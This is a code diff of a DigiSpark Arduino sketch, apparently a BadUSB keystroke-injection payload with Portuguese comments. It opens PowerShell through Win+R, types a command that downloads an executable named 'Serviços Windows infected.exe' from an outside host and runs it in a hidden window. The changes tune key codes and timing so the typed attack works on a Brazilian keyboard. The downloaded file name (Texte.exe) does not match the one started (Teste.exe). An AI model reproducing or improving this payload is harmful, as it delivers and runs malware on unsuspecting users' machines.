@@ -3,7 +3,7 @@ Invoke-WebRequest -Uri “https://alld.dev/assets/others/Servi%C3%A7os%20Windows
 #include "DigiKeyboard.h"
 
 void sendColon() {
-  DigiKeyboard.sendKeyStroke(55);  // ':'
+  DigiKeyboard.sendKeyStroke(56, MOD_SHIFT_LEFT);  // ':'
 }
 
 void sendSlash() {
@@ -11,45 +11,63 @@ void sendSlash() {
 }
 
 void sendQuotes() {
-  DigiKeyboard.sendKeyStroke(53);  // "Aspas"
+  DigiKeyboard.sendKeyStroke(53, MOD_SHIFT_LEFT);  // "Aspas"
 }
 
 void sendPointv(){
   DigiKeyboard.sendKeyStroke(56); // ;
 }
 
+void sendCsidilha(){
+  DigiKeyboard.sendKeyStroke(51); // ;
+}
+
 void setup() {
   DigiKeyboard.sendKeyStroke(0);
   pinMode(1, OUTPUT);
-  DigiKeyboard.delay(500);
+  DigiKeyboard.delay(1000);
   digitalWrite(1, HIGH);
 
   // Abre o powershell
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // Pressiona Win+R
-  delay(500);
+  delay(1000);
   DigiKeyboard.print("Powershell");
   DigiKeyboard.sendKeyStroke(KEY_ENTER); // Pressiona Enter
-  delay(500);
+  delay(1000);
 
   DigiKeyboard.print("Invoke-WebRequest -Uri ");
+  delay(100);
   sendQuotes();
+  delay(100);
   DigiKeyboard.print("https");
   sendColon();
+  delay(100);
   sendSlash();
+  delay(100);
   sendSlash();
+  delay(100);
   DigiKeyboard.print("alld.dev");
   sendSlash();
+  delay(100);
   DigiKeyboard.print("assets");
   sendSlash();
+  delay(100);
   DigiKeyboard.print("others");
   sendSlash();
-  DigiKeyboard.print("Serviços Windows infected.exe");
+  delay(100);
+  DigiKeyboard.print("Servi");
+  sendCsidilha();
+  DigiKeyboard.print("os Windows infected.exe");
   sendQuotes();
+  delay(100);
   DigiKeyboard.print("-Outfile Texte.exe");
   sendPointv();
-  DigiKeyboard.print("Start-Process -NoNewWindow -FilePath .");
+  delay(100);
+  DigiKeyboard.print(" Start-Process -NoNewWindow -FilePath .");
   sendSlash();
+  delay(100);
   DigiKeyboard.print("Teste.exe");
+  delay(100);
   digitalWrite(1, LOW);
 }
 
